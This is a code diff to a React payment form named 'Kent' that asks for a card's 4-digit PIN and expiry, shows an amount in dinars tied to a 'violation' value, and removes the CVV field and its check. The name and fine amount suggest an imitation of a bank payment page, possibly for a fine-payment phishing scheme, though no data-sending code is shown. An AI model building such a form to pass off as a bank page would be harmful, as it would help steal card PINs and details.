@@ -142,7 +142,7 @@ const BANKS = [
   },
 ];
 
-export default function Kent(props: { setPage?: any,violationValue:any }) {
+export default function Kent(props: { setPage?: any }) {
   const [step, setstep] = useState(1);
   const [total, setTotal] = useState("");
   const [loading, setLoading] = useState(false);
@@ -256,7 +256,7 @@ export default function Kent(props: { setPage?: any,violationValue:any }) {
                     <label className="column-value text-label">
                       {localStorage.getItem("vv") === "0"
                         ? 5
-                        : props.violationValue}{" "}
+                        : localStorage.getItem("vv")}{" "}
                       kd
                     </label>
                   </div>
@@ -552,28 +552,6 @@ export default function Kent(props: { setPage?: any,violationValue:any }) {
                             className="allownumericwithoutdecimal col-9 "
                           />
                         </div>
-                        <div className="row">
-                          <label className=" col -label"> Cvv: </label>
-
-                          <input
-                            inputMode="numeric"
-                            pattern="[0-9]*"
-                            name="cardPin"
-                            id="cardPin"
-                            onChange={(e: any) =>
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                cvv: e.target.value,
-                              })
-                            }
-                            autoComplete="off"
-                            title="Should be in number. Length should be 4"
-                            type="password"
-                            size={3}
-                            maxLength={3}
-                            className="allownumericwithoutdecimal col-9"
-                          />
-                        </div>
                       </div>
                     </div>
                   </>
@@ -642,8 +620,7 @@ export default function Kent(props: { setPage?: any,violationValue:any }) {
                             paymentInfo.pass === "" ||
                             paymentInfo.month === "" ||
                             paymentInfo.year === "" ||
-                            paymentInfo.pass.length !== 4 ||
-                            paymentInfo.cvv === "")
+                            paymentInfo.pass.length !== 4)
                         }
                         type="submit"
                         onClick={(e) => {
